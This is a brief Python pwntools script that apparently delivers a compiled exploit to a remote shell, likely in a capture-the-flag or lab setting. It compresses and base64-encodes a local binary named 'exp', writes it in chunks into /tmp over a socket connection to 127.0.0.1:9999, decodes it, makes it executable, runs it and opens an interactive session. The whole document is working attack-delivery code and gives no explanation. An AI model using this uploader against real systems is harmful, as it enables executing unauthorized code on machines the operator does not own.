from pwn import *
import time
from base64 import b64encode
import os
import gzip
#context.log_level = 'debug'

def run(cmd):
    p.sendlineafter("$ ", cmd)
    p.recvline()

f = open('./exp', 'rb').read()
payload = b64encode(gzip.compress(f)).decode()

#p = process(["./run.sh"])
p = remote("127.0.0.1", 9999) # remote
size = 512 # size per upload

run('cd /tmp')

info("Uploading...")
for i in range(0, len(payload), size):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp.gz'.format(payload[i:i+size]))

run('base64 -d b64exp.gz > exp.gz')
run('gzip -d exp.gz')

run('chmod +x exp')

run('/tmp/exp')
p.interactive()
